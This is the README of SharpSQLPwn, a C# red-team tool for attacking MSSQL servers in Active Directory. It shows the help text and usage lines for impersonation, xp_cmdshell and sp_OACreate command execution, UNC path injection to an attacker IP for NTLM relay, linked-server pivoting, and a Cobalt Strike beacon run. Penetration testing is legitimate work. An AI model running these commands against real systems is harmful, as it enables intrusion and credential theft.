# SharpSQLPwn

C# tool to identify and exploit weaknesses with MSSQL instances in Active Directory environments

```
.\SharpSQLPwn.exe /help

   _____ __                    _____ ____    __    ____
  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \
 ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /
/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/
                     /_/
   https://github.com/lefayjey/SharpSQLPwn
   Author:  lefayjey


Usage:
    - Basic recon:
        SharpSQLPwn.exe /modules:R /target:SQLServer [/db:DatabaseName]
    - Impersonation:
        SharpSQLPwn.exe /modules:I /target:SQLServer [/db:DatabaseName] /impuser:ImpersonatedUser
    - Command Execution (Optional: add module I to impersonate user before command execution):
        SharpSQLPwn.exe /modules:C[I] /target:SQLServer [/db:DatabaseName] /cmdtech:CmdExecTechnique /cmd:Command [/impuser:ImpersonatedUser]
    - UNC Path Injection (Optional: add module I to impersonate user before path injection):
        SharpSQLPwn.exe /modules:U[I] /target:SQLServer [/db:DatabaseName] /localIP:AttackerIP [/impuser:ImpersonatedUser]
    - Linked Servers (Optional: add /cmd:<command> to execute command on linked SQL server, and /localIP:<AttackerIP> to perform path injection):
        SharpSQLPwn.exe /modules:L /target:SQLServer [/db:DatabaseName] /linkedsql:LinkedSQLServer [/cmdtech:CmdExecTechnique] [/cmd:Command] [/localIP:AttackerIP]
    - All modules:
        SharpSQLPwn.exe /modules:RICUL /target:SQLServer [/db:DatabaseName] /impuser:ImpersonatedUser /cmdtech:CmdExecTechnique /cmd:Command /localIPAttackerIP /linkedsqlLinkedSQLServer
    - Interactive mode:
        SharpSQLPwn.exe /interactive


Arguments:
    /target      - Target SQL server hostname or IP (default: LocalMachine)
    /db          - Database name of target SQL server (default: master)
    /modules     - Specify modules to run (default: R). Choose multiple modules by concatening letters, example: /modules:RI
            R=Recon
            I=Impersonation
            C=CommandExecution
            U=UNCPathInjection
            L=LinkedSQL
    /impuser     - Name of user to impersonate (default: sa)
    /cmdtech     - Specify execution technique (default: 1)
            1=xp_cmdshell
            2=sp_OACreate
            3=dll_assembly
    /cmd         - Command to execute
    /localIP     - Local IP of the attacker (used for responder or ntlmrelay or Inveigh)
    /linkedsql   - Target linked SQL Server Hostname or IP
    /interactive - Run Interactive version
    /help        - Show this help message
  ```

## CobaltStrike Execute-Assembly
```
beacon> execute-assembly C:\path\to\SharpSQLPwn.exe
[*] Tasked beacon to run .NET program: SharpSQLPwn.exe
[+] host called home, sent: 151099 bytes
[+] received output:

   _____ __                    _____ ____    __    ____     
  / ___// /_  ____ __________ / ___// __ \  / /   / __ \_      ______ 
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ / / / / /   / /_/ / | /| / / __ \
 ___/ / / / / /_/ / /  / /_/ /__/ / /_/ / / /___/ ____/| |/ |/ / / / /
/____/_/ /_/\__,_/_/  / .___/____/\___\_\/_____/_/     |__/|__/_/ /_/ 
                     /_/                                              
   https://github.com/lefayjey/SharpSQLPwn
   Author:  lefayjey
```